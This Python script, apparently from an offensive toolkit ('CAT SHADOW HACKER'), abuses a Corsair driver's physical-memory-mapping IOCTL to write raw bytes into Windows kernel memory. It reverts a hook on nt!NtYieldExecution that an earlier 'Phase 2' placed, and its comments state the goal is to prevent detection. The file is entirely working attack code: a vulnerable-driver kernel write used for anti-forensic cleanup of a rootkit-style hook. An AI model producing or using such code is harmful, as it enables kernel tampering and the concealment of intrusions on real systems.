import ctypes
import struct
import sys

# CAT SHADOW HACKER - EMERGENCY RESTORATION SCRIPT
# MISSION: REVERT KERNEL HOOKS IMMEDIATELY TO PREVENT DETECTION

# Exact addresses used in Phase 2
HOOK_PA = 0x1007111D0
ORIGINAL_PREAMBLE = bytes([0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xE8, 0x15, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3])

# Corsair IOCTLs
IOCTL_MAP_PHYS_MEM = 0x00225374
PAGE_SIZE = 0x1000

kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

def map_page(h, pa):
    pa_base = pa & ~0xFFF
    inp = struct.pack("<QII", pa_base, PAGE_SIZE, 0)
    out = ctypes.c_uint64(0)
    ret = ctypes.c_uint32(0)
    ok = kernel32.DeviceIoControl(h, IOCTL_MAP_PHYS_MEM, inp, 16, ctypes.byref(out), 8, ctypes.byref(ret), None)
    if not ok or not out.value: return None
    return out.value

def write_phys(h, pa, data):
    v = map_page(h, pa)
    if not v: return False
    offset = pa & 0xFFF
    dst = (ctypes.c_ubyte * len(data)).from_address(v + offset)
    for i in range(len(data)):
        dst[i] = data[i]
    return True

def main():
    print("[!] EMERGENCY RESTORATION INITIALIZED...")
    h = kernel32.CreateFileW(r"\\.\CorsairLLAccess64", 0xC0000000, 7, None, 3, 0x80, None)
    if h == -1:
        print("[-] Driver not open. If you rebooted, you are already safe.")
        return

    print(f"[*] Restoring nt!NtYieldExecution at PA 0x{HOOK_PA:X}...")
    if write_phys(h, HOOK_PA, ORIGINAL_PREAMBLE):
        print("[+] SUCCESS! Hook reverted to original state.")
    else:
        print("[-] FAILED to revert hook. Critical risk remains!")

    kernel32.CloseHandle(h)
    print("[!] EMERGENCY RESTORATION COMPLETE.")

if __name__ == "__main__":
    main()
